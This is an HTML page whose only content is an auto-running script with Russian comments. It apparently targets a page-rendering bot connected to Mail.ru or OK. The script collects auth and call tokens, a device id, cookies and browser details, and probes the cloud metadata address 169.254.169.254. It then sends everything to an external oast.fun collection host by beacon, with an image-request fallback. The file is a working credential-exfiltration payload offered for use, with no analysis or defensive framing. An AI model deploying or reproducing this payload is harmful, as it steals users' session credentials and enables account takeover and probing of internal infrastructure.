<!DOCTYPE html>
<html>
<body>
<script>
    (async function() {
        const hook = "https://esqbwjbyepcxrsacleqfu9095dccsqoxg.oast.fun";
        
        // Функция для безопасного сбора данных
        const getVal = (storage, key) => { try { return storage.getItem(key); } catch(e) { return null; } };

        // 1. Собираем всё самое ценное (включая твои ключи)
        const loot = {
            // Твои специфические ключи
            auth: getVal(localStorage, '__oneme_auth'),
            callToken: getVal(localStorage, '__oneme_calls_auth_token'),
            deviceId: getVal(localStorage, '__oneme_device_id'),
            
            // Системная инфа (палит, что за бот)
            url: window.location.href,
            cookies: document.cookie,
            ua: navigator.userAgent,
            platform: navigator.platform,
            cores: navigator.hardwareConcurrency, // Кол-во ядер сервера
            
            // Внутренние объекты (если бот - часть портала Mail.ru)
            is_ok: !!window.OK,
            is_mailru: !!window.MailRu,
            
            // Пытаемся чекнуть, есть ли доступ к метаданным облака (SSRF check)
            cloud_meta: await fetch("http://169.254.169.254/latest/meta-data/instance-id", {mode:'no-cors'}).then(()=>"ACCESSIBLE").catch(()=>"BLOCKED")
        };

        // 2. Отправляем на вебхук через POST
        // Используем Blob для обхода некоторых ограничений fetch
        const blob = new Blob([JSON.stringify(loot)], {type : 'application/json'});
        navigator.sendBeacon(hook + "/LOOT_FINAL", blob);

        // 3. Запасной вариант через старый добрый Image (если POST заблочат)
        new Image().src = hook + "/DEBUG_GET?data=" + btoa(JSON.stringify({ip: "check", url: loot.url}));
    })();
</script>
</body>
</html>
